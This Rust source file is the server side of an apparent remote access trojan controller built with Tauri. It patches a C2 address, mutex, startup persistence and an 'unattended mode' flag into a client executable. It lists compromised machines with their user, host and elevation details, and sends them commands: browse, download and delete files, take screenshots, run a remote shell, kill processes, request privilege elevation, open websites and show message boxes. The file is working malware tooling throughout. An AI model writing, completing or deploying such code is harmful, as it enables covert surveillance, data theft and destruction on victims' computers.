use tauri::State;
use crate::handlers::{ SharedServer, SharedTauriState, FrontClient, TauriState };
use common::commands::{ Command, File as FileData, Process, VisitWebsiteData, MessageBoxData };

use serde::Serialize;
use object::{ Object, ObjectSection };
use std::fs::{ self, File };
use std::io::Write;
use std::vec;
use std::ptr::null_mut as NULL;
use winapi::um::winuser;

use rmp_serde::Serializer;

#[tauri::command]
pub fn start_server(
    port: &str,
    server_state: State<'_, SharedServer>,
    tauri_state: State<'_, SharedTauriState>
) -> String {
    let mut server = server_state.0.lock().unwrap();
    let running = server.listen_port(port.to_string());

    let mut tauri_state = tauri_state.0.lock().unwrap();

    if !running {
        tauri_state.running = false;
        return "false".to_string();
    }

    tauri_state.port = port.to_string();
    tauri_state.running = true;

    "true".to_string()
}

#[tauri::command]
pub fn fetch_state(tauri_state: State<'_, SharedTauriState>) -> TauriState {
    let tauri_state = tauri_state.0.lock().unwrap();
    tauri_state.clone()
}

#[tauri::command]
pub fn build_client(
    ip: &str,
    port: &str,
    mutex_enabled: bool,
    mutex: &str,
    unattended_mode: bool,
    startup: bool
) {
    let bin_data = fs::read("target/debug/client.exe").unwrap();
    let file = object::File::parse(&*bin_data).unwrap();

    let mut output_data = bin_data.clone();

    let config = common::ClientConfig {
        ip: ip.to_string(),
        port: port.to_string(),
        mutex_enabled,
        mutex: mutex.to_string(),
        unattended_mode,
        startup,
    };

    let mut buffer: Vec<u8> = Vec::new();

    config.serialize(&mut Serializer::new(&mut buffer)).unwrap();

    let mut new_data = vec![0u8; 1024];

    for (i, byte) in buffer.iter().enumerate() {
        new_data[i] = *byte;
    }

    if let Some(section) = file.section_by_name(".zzz") {
        let offset = section.file_range().unwrap().0 as usize;
        let size = section.size() as usize;

        output_data[offset..offset + size].copy_from_slice(&new_data);
    }

    let mut file = File::create("target/debug/Client_built.exe").unwrap();
    let _ = file.write_all(&output_data);
}

#[tauri::command]
pub fn fetch_clients(
    server_state: State<'_, SharedServer>,
    tauri_state: State<'_, SharedTauriState>
) -> Vec<FrontClient> {
    let server = server_state.0.lock().unwrap();

    let tauri_state = tauri_state.0.lock().unwrap();

    if !tauri_state.running {
        return vec![];
    }

    let mut clients: Vec<FrontClient> = vec![];

    for (i, client) in (*server.clients.lock().unwrap()).iter_mut().enumerate() {
        if !client.is_handled {
            client.is_handled = true;
            client.handle_client();
        }

        if client.is_disconnect() {
            continue;
        }

        let front_client = FrontClient {
            id: i,
            username: client.get_username(),
            hostname: client.get_hostname(),
            os: client.get_os(),
            ram: client.get_ram(),
            cpu: client.get_cpu(),
            gpus: client.get_gpus(),
            storage: client.get_storage(),
            displays: client.get_displays(),
            ip: client.get_ip(),
            disconnected: client.is_disconnect(),
            is_elevated: client.is_elevated(),
        };

        clients.push(front_client);
    }
    clients.clone()
}

#[tauri::command]
pub fn fetch_client(id: &str, server_state: State<'_, SharedServer>) -> FrontClient {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let clients = server.clients.lock().unwrap();
    let client = clients.get(client_id).unwrap();

    FrontClient {
        id: client_id,
        username: client.get_username(),
        hostname: client.get_hostname(),
        os: client.get_os(),
        ram: client.get_ram(),
        cpu: client.get_cpu(),
        gpus: client.get_gpus(),
        storage: client.get_storage(),
        displays: client.get_displays(),
        ip: client.get_ip(),
        disconnected: client.is_disconnect(),
        is_elevated: client.is_elevated(),
    }
}

#[tauri::command]
pub fn read_files(
    id: &str,
    run: &str,
    path: &str,
    server_state: State<'_, SharedServer>
) -> (String, Vec<FileData>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.reset_files();
    client.reset_path();

    match run {
        "previous_dir" => {
            client.write_buffer(Command::PreviousDir, &Some(client.get_secret()));
        }
        "available_disks" => {
            client.write_buffer(Command::AvailableDisks, &Some(client.get_secret()));
        }
        "view_dir" => {
            client.write_buffer(Command::ViewDir(path.to_string()), &Some(client.get_secret()));
        }
        _ => {
            return ("".to_string(), vec![]);
        }
    }

    std::thread::sleep(std::time::Duration::from_millis(200));

    (client.get_path(), client.get_files())
}

#[tauri::command]
pub fn manage_file(
    id: &str,
    run: &str,
    file: &str,
    server_state: State<'_, SharedServer>
) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    match run {
        "download_file" => {
            client.write_buffer(
                Command::DownloadFile(file.to_string()),
                &Some(client.get_secret())
            );
        }
        "remove_file" => {
            client.write_buffer(Command::RemoveFile(file.to_string()), &Some(client.get_secret()));
        }
        "remove_dir" => {
            client.write_buffer(Command::RemoveDir(file.to_string()), &Some(client.get_secret()));
        }
        _ => {
            return "false".to_string();
        }
    }

    "true".to_string()
}

#[tauri::command]
pub fn take_screenshot(id: &str, display: i32, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(
        Command::ScreenshotDisplay(display.to_string()),
        &Some(client.get_secret())
    );
}

#[tauri::command]
pub fn handle_system_command(id: &str, run: &str, server_state: State<'_, SharedServer>) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(Command::ManageSystem(run.to_string()), &Some(client.get_secret()));

    "true".to_string()
}

#[tauri::command]
pub fn manage_shell(id: &str, run: &str, server_state: State<'_, SharedServer>) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    if run == "start" {
        if client.shell_started {
            return "true".to_string();
        }
        client.shell_started = true;
        client.write_buffer(Command::StartShell, &Some(client.get_secret()));
        return "true".to_string();
    }

    if run == "stop" {
        if !client.shell_started {
            return "false".to_string();
        }
        client.shell_started = false;
        client.write_buffer(Command::ExitShell, &Some(client.get_secret()));
        return "false".to_string();
    }

    if run == "status" {
        if client.shell_started {
            return "true".to_string();
        }
        return "false".to_string();
    }

    "false".to_string()
}

#[tauri::command]
pub fn execute_shell_command(id: &str, run: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let server_clone = server.clone();

    let mut clients = server_clone.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    if client.shell_started {
        client.write_buffer(Command::ShellCommand(run.to_string()), &Some(client.get_secret()));
    }
}

#[tauri::command]
pub fn process_list(id: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(Command::GetProcessList, &Some(client.get_secret()));
}

#[tauri::command]
pub fn kill_process(
    id: &str,
    pid: usize,
    name: &str,
    server_state: State<'_, SharedServer>
) -> String {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(
        Command::KillProcess(Process { pid, name: name.to_string() }),
        &Some(client.get_secret())
    );

    "true".to_string()
}

#[tauri::command]
pub fn manage_client(id: &str, run: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    match run {
        "disconnect" => {
            client.write_buffer(Command::Disconnect, &Some(client.get_secret()));
        }
        "reconnect" => {
            client.write_buffer(Command::Reconnect, &Some(client.get_secret()));
        }
        _ => {}
    }
}

#[tauri::command]
pub fn visit_website(id: &str, url: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(
        Command::VisitWebsite(VisitWebsiteData {
            visit_type: "normal".to_string(),
            url: url.to_string(),
        }),
        &Some(client.get_secret())
    );
}

#[tauri::command]
pub fn elevate_client(id: &str, server_state: State<'_, SharedServer>) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(Command::ElevateClient, &Some(client.get_secret()));
}

#[tauri::command]
pub fn test_messagebox(title: &str, message: &str, button: &str, icon: &str) {
    let l_msg: Vec<u16> = format!("{}\0", message).encode_utf16().collect();
    let l_title: Vec<u16> = format!("{}\0", title).encode_utf16().collect();

    unsafe {
        winuser::MessageBoxW(
            NULL(),
            l_msg.as_ptr(),
            l_title.as_ptr(),
            (match button {
                "ok" => winuser::MB_OK,
                "ok_cancel" => winuser::MB_OKCANCEL,
                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
                "yes_no" => winuser::MB_YESNO,
                "retry_cancel" => winuser::MB_RETRYCANCEL,
                _ => winuser::MB_OK,
            }) |
                (match icon {
                    "info" => winuser::MB_ICONINFORMATION,
                    "warning" => winuser::MB_ICONWARNING,
                    "error" => winuser::MB_ICONERROR,
                    "question" => winuser::MB_ICONQUESTION,
                    "asterisk" => winuser::MB_ICONASTERISK,
                    _ => winuser::MB_ICONINFORMATION,
                })
        );
    }
}

#[tauri::command]
pub fn send_messagebox(
    id: &str,
    title: &str,
    message: &str,
    button: &str,
    icon: &str,
    server_state: State<'_, SharedServer>
) {
    let server = server_state.0.lock().unwrap();

    let client_id = id.parse::<usize>().unwrap();

    let mut clients = server.clients.lock().unwrap();
    let client = clients.get_mut(client_id).unwrap();

    client.write_buffer(
        Command::ShowMessageBox(MessageBoxData {
            title: title.to_string(),
            message: message.to_string(),
            button: button.to_string(),
            icon: icon.to_string(),
        }),
        &Some(client.get_secret())
    );
}
